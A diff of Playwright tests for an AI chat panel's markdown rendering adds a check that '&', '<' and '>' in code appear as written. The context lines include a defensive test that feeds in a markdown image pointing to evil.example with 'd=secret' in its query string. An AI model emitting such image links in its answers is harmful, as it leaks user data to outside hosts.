@@ -45,6 +45,16 @@ test.describe('Chat panel answer rendering', () => {
     expect(await wasScriptRun(page)).toBe(false);
   });
 
+  test('it shows "&", "<" and ">" in code as they were written', async ({page}) => {
+    await chatMock.install(page, markdownAnswer('Filter on `qty > 0 && status = 1`\n\n```\nx < y && z\n```'));
+    await chatPanel.openOnDashboard(page);
+    await chatPanel.askAndAwaitReply(page, 'How do I filter on stock?');
+
+    const answer = chatPanel.lastAssistantMessage(page);
+    await expect(answer.locator('p code')).toHaveText('qty > 0 && status = 1');
+    await expect(answer.locator('pre code')).toHaveText('x < y && z');
+  });
+
   test('it shows the alt text of an off-site image instead of loading it', async ({page}) => {
     const offSiteRequests = chatMock.countRequestsTo(page, EVIL_HOST);
     await chatMock.install(page, markdownAnswer('Chart: ![sales chart](https://evil.example/pixel.png?d=secret)'));
